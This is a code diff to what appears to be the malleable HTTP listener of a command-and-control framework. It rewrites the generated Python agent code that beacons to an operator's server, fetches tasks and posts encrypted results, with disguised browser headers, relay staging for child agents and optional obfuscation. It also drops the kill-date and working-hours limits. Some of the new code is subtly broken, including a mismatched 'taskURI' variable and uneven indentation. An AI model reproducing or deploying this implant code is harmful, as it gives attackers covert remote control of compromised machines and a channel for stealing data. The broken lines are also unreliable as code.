@@ -759,8 +759,8 @@ class Listener:
         delay = listenerOptions["DefaultDelay"]["Value"]
         jitter = listenerOptions["DefaultJitter"]["Value"]
         lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
-        killDate = listenerOptions["KillDate"]["Value"]
-        workingHours = listenerOptions["WorkingHours"]["Value"]
+        listenerOptions["KillDate"]["Value"]
+        listenerOptions["WorkingHours"]["Value"]
         b64DefaultResponse = base64.b64encode(
             self.default_response().encode("UTF-8")
         ).decode("UTF-8")
@@ -813,25 +813,16 @@ class Listener:
             code = helpers.strip_python_comments(code)
 
             # patch in the delay, jitter, lost limit, and comms profile
-            code = code.replace("delay = 60", f"delay = { delay }")
-            code = code.replace("jitter = 0.0", f"jitter = { jitter }")
+            code = code.replace("delay=60", f"delay={ delay }")
+            code = code.replace("jitter=0.0", f"jitter={ jitter }")
             code = code.replace(
                 'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                 f'profile = "{ profileStr }"',
             )
-            code = code.replace("lostLimit = 60", f"lostLimit = { lostLimit }")
             code = code.replace(
                 'defaultResponse = base64.b64decode("")',
                 f'defaultResponse = base64.b64decode("{ b64DefaultResponse }")',
             )
-
-            # patch in the killDate and workingHours if they're specified
-            if killDate != "":
-                code = code.replace('killDate = ""', f'killDate = "{ killDate }"')
-            if workingHours != "":
-                code = code.replace(
-                    'workingHours = ""', f'workingHours = "{ workingHours }"'
-                )
 
             if obfuscate:
                 code = self.mainMenu.obfuscationv2.python_obfuscate(code)
@@ -1092,33 +1083,59 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                 return updateServers + getTask + sendMessage
 
             elif language.lower() == "python":
-                # Python
-                updateServers = "server = '%s'\n" % (host)
+                sendMessage = f"""
+import base64
+import urllib
+import random
+import sys
 
-                # ==== HANDLE SSL ====
-                if host.startswith("https"):
-                    updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None\n"
 
-                sendMessage = "def send_message(packets=None):\n"
-                sendMessage += "    global missedCheckins\n"
-                sendMessage += "    global server\n"
-                sendMessage += "    global headers\n"
-                sendMessage += "    global taskURIs\n"
+class ExtendedPacketHandler(PacketHandler):
+    def __init__(self, agent, staging_key, session_id, headers, server, taskURIs, key=None):
+        super().__init__(agent=agent, staging_key=staging_key, session_id=session_id, key=key)
+        self.headers = headers
+        self.taskURIs = taskURIs
+        self.server = server
 
-                sendMessage += "    vreq = type('vreq', (urllib.request.Request, object), {'get_method':lambda self:self.verb if (hasattr(self, 'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
+    def post_message(self, uri, data):
+        return (urllib.request.urlopen(urllib.request.Request(uri, data, self.headers))).read()
+
+    def send_results_for_child(self, received_data):
+        self.headers['Cookie'] = "session=%s" % (received_data[1:])
+        taskUri = random.sample({str(profile.post.client.uris)}, 1)[0]
+        requestUri = self.server + taskURI
+        response = (urllib.request.urlopen(urllib.request.Request(requestUri, None, self.headers))).read()
+        return response
+
+    def send_get_tasking_for_child(self, received_data):
+        decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
+        taskUri = random.sample({str(profile.post.client.uris)}, 1)[0]
+        requestUri = self.server + taskURI
+        response = (urllib.request.urlopen(urllib.request.Request(requestUri, decoded_data, self.headers))).read()
+        return response
+
+    def send_staging_for_child(self, received_data, hop_name):
+        postURI = self.server + "/login/process.php"
+        self.headers['Hop-Name'] = hop_name
+        decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
+        response = (urllib.request.urlopen(urllib.request.Request(postURI, decoded_data, self.headers))).read()
+        return response
+"""
+                sendMessage += "    def send_message(self, packets=None):\n"
+                sendMessage += "        vreq = type('vreq', (urllib.request.Request, object), {'get_method':lambda self:self.verb if (hasattr(self, 'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
 
                 # ==== BUILD POST ====
-                sendMessage += "    if packets:\n"
+                sendMessage += "        if packets:\n"
 
                 # ==== BUILD ROUTING PACKET ====
                 sendMessage += (
-                    "        encData = aes_encrypt_then_hmac(key, packets);\n"
+                    "            encData = aes_encrypt_then_hmac(self.key, packets);\n"
                 )
-                sendMessage += "        routingPacket = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData);\n"
+                sendMessage += "            routingPacket = self.build_routing_packet(self.staging_key, self.session_id, meta=5, enc_data=encData);\n"
                 sendMessage += (
                     "\n".join(
                         [
-                            "        " + _
+                            "            " + _
                             for _ in profile.post.client.output.generate_python(
                                 "routingPacket"
                             ).split("\n")
@@ -1129,74 +1146,86 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
 
                 # ==== CHOOSE URI ====
                 sendMessage += (
-                    "        taskUri = random.sample("
+                    "            taskUri = random.sample("
                     + str(profile.post.client.uris)
                     + ", 1)[0]\n"
                 )
-                sendMessage += "        requestUri = server + taskUri\n"
+                sendMessage += "            requestUri = self.server + taskUri\n"
 
                 # ==== ADD PARAMETERS ====
-                sendMessage += "        parameters = {}\n"
+                sendMessage += "            parameters = {}\n"
                 for parameter, value in profile.post.client.parameters.items():
                     sendMessage += (
-                        "        parameters['" + parameter + "'] = '" + value + "'\n"
+                        "            parameters['"
+                        + parameter
+                        + "'] = '"
+                        + value
+                        + "'\n"
                     )
                 if (
                     profile.post.client.output.terminator.type
                     == malleable.Terminator.PARAMETER
                 ):
                     sendMessage += (
-                        "        parameters['"
+                        "            parameters['"
                         + profile.post.client.output.terminator.arg
                         + "'] = routingPacket;\n"
                     )
-                sendMessage += "        if parameters:\n"
-                sendMessage += "            requestUri += '?' + urllib.parse.urlencode(parameters)\n"
+                sendMessage += "            if parameters:\n"
+                sendMessage += "                requestUri += '?' + urllib.parse.urlencode(parameters)\n"
 
                 if (
                     profile.post.client.output.terminator.type
                     == malleable.Terminator.URIAPPEND
                 ):
-                    sendMessage += "        requestUri += routingPacket\n"
+                    sendMessage += "            requestUri += routingPacket\n"
 
                 # ==== ADD BODY ====
                 if (
                     profile.post.client.output.terminator.type
                     == malleable.Terminator.PRINT
                 ):
-                    sendMessage += "        body = routingPacket\n"
+                    sendMessage += "            body = routingPacket\n"
                 else:
-                    sendMessage += "        body = '" + profile.post.client.body + "'\n"
-                sendMessage += "        try:\n            body=body.encode()\n        except AttributeError:\n            pass\n"
+                    sendMessage += (
+                        "            body = '" + profile.post.client.body + "'\n"
+                    )
+                sendMessage += "            try:\n                body=body.encode()\n            except AttributeError:\n                pass\n"
 
                 # ==== BUILD REQUEST ====
-                sendMessage += "        req = vreq(requestUri, body)\n"
-                sendMessage += "        req.verb = '" + profile.post.client.verb + "'\n"
+                sendMessage += "            req = vreq(requestUri, body)\n"
+                sendMessage += (
+                    "            req.verb = '" + profile.post.client.verb + "'\n"
+                )
 
                 # ==== ADD HEADERS ====
                 for header, value in profile.post.client.headers.items():
                     sendMessage += (
-                        "        req.add_header('" + header + "', '" + value + "')\n"
+                        "            req.add_header('"
+                        + header
+                        + "', '"
+                        + value
+                        + "')\n"
                     )
                 if (
                     profile.post.client.output.terminator.type
                     == malleable.Terminator.HEADER
                 ):
                     sendMessage += (
-                        "        req.add_header('"
+                        "            req.add_header('"
                         + profile.post.client.output.terminator.arg
                         + "', routingPacket)\n"
                     )
 
                 # ==== BUILD GET ====
-                sendMessage += "    else:\n"
+                sendMessage += "        else:\n"
 
                 # ==== BUILD ROUTING PACKET
-                sendMessage += "        routingPacket = build_routing_packet(stagingKey, sessionID, meta=4);\n"
+                sendMessage += "            routingPacket = self.build_routing_packet(self.staging_key, self.session_id, meta=4);\n"
                 sendMessage += (
                     "\n".join(
                         [
-                            "        " + _
+                            "            " + _
                             for _ in profile.get.client.metadata.generate_python(
                                 "routingPacket"
                             ).split("\n")
@@ -1207,68 +1236,80 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
 
                 # ==== CHOOSE URI ====
                 sendMessage += (
-                    "        taskUri = random.sample("
+                    "            taskUri = random.sample("
                     + str(profile.get.client.uris)
                     + ", 1)[0]\n"
                 )
-                sendMessage += "        requestUri = server + taskUri;\n"
+                sendMessage += "            requestUri = self.server + taskUri;\n"
 
                 # ==== ADD PARAMETERS ====
-                sendMessage += "        parameters = {}\n"
+                sendMessage += "            parameters = {}\n"
                 for parameter, value in profile.get.client.parameters.items():
                     sendMessage += (
-                        "        parameters['" + parameter + "'] = '" + value + "'\n"
+                        "             parameters['"
+                        + parameter
+                        + "'] = '"
+                        + value
+                        + "'\n"
                     )
                 if (
                     profile.get.client.metadata.terminator.type
                     == malleable.Terminator.PARAMETER
                 ):
                     sendMessage += (
-                        "        parameters['"
+                        "             parameters['"
                         + profile.get.client.metadata.terminator.arg
                         + "'] = routingPacket\n"
                     )
-                sendMessage += "        if parameters:\n"
-                sendMessage += "            requestUri += '?' + urllib.parse.urlencode(parameters)\n"
+                sendMessage += "            if parameters:\n"
+                sendMessage += "                requestUri += '?' + urllib.parse.urlencode(parameters)\n"
 
                 if (
                     profile.get.client.metadata.terminator.type
                     == malleable.Terminator.URIAPPEND
                 ):
-                    sendMessage += "        requestUri += routingPacket;\n"
+                    sendMessage += "                requestUri += routingPacket;\n"
 
                 # ==== ADD BODY ====
                 if (
                     profile.get.client.metadata.terminator.type
                     == malleable.Terminator.PRINT
                 ):
-                    sendMessage += "        body = routingPacket\n"
+                    sendMessage += "                body = routingPacket\n"
                 else:
-                    sendMessage += "        body = '" + profile.get.client.body + "'\n"
-                sendMessage += "        try:\n            body=body.encode()\n        except AttributeError:\n            pass\n"
+                    sendMessage += (
+                        "            body = '" + profile.get.client.body + "'\n"
+                    )
+                sendMessage += "            try:\n                body=body.encode()\n            except AttributeError:\n                pass\n"
 
                 # ==== BUILD REQUEST ====
-                sendMessage += "        req = vreq(requestUri, body)\n"
-                sendMessage += "        req.verb = '" + profile.get.client.verb + "'\n"
+                sendMessage += "            req = vreq(requestUri, body)\n"
+                sendMessage += (
+                    "            req.verb = '" + profile.get.client.verb + "'\n"
+                )
 
                 # ==== ADD HEADERS ====
                 for header, value in profile.get.client.headers.items():
                     sendMessage += (
-                        "        req.add_header('" + header + "', '" + value + "')\n"
+                        "            req.add_header('"
+                        + header
+                        + "', '"
+                        + value
+                        + "')\n"
                     )
                 if (
                     profile.get.client.metadata.terminator.type
                     == malleable.Terminator.HEADER
                 ):
                     sendMessage += (
-                        "        req.add_header('"
+                        "            req.add_header('"
                         + profile.get.client.metadata.terminator.arg
                         + "', routingPacket)\n"
                     )
 
                 # ==== SEND REQUEST ====
-                sendMessage += "    try:\n"
-                sendMessage += "        res = urllib.request.urlopen(req);\n"
+                sendMessage += "        try:\n"
+                sendMessage += "            res = urllib.request.urlopen(req);\n"
 
                 # ==== EXTRACT RESPONSE ====
                 if (
@@ -1277,18 +1318,18 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                 ):
                     header = profile.get.server.output.terminator.arg
                     sendMessage += (
-                        "        data = res.info().dict['"
+                        "            data = res.info().dict['"
                         + header
                         + "'] if '"
                         + header
                         + "' in res.info().dict else ''\n"
                     )
-                    sendMessage += "        data = urllib.parse.unquote(data)\n"
+                    sendMessage += "            data = urllib.parse.unquote(data)\n"
                 elif (
                     profile.get.server.output.terminator.type
                     == malleable.Terminator.PRINT
                 ):
-                    sendMessage += "        data = res.read()\n"
+                    sendMessage += "            data = res.read()\n"
 
                 # ==== DECODE RESPONSE ====
                 sendMessage += (
@@ -1303,24 +1344,22 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                     + "\n"
                 )
                 # before return we encode to bytes, since in some transformations "join" produces str
-                sendMessage += (
-                    "        if isinstance(data,str): data = data.encode('latin-1');\n"
-                )
-                sendMessage += "        return ('200', data)\n"
+                sendMessage += "            if isinstance(data,str): data = data.encode('latin-1');\n"
+                sendMessage += "            return ('200', data)\n"
 
                 # ==== HANDLE ERROR ====
-                sendMessage += "    except urllib.request.HTTPError as HTTPError:\n"
-                sendMessage += "        missedCheckins += 1\n"
-                sendMessage += "        if HTTPError.code == 401:\n"
-                sendMessage += "            sys.exit(0)\n"
-                sendMessage += "        return (HTTPError.code, '')\n"
-                sendMessage += "    except urllib.request.URLError as URLError:\n"
-                sendMessage += "        missedCheckins += 1\n"
-                sendMessage += "        return (URLError.reason, '')\n"
+                sendMessage += "        except urllib.request.HTTPError as HTTPError:\n"
+                sendMessage += "            self.missedCheckins += 1\n"
+                sendMessage += "            if HTTPError.code == 401:\n"
+                sendMessage += "                sys.exit(0)\n"
+                sendMessage += "            return (HTTPError.code, '')\n"
+                sendMessage += "        except urllib.request.URLError as URLError:\n"
+                sendMessage += "            self.missedCheckins += 1\n"
+                sendMessage += "            return (URLError.reason, '')\n"
 
-                sendMessage += "    return ('', '')\n"
+                sendMessage += "        return ('', '')\n"
 
-                return updateServers + sendMessage
+                return sendMessage
 
             else:
                 log.error(
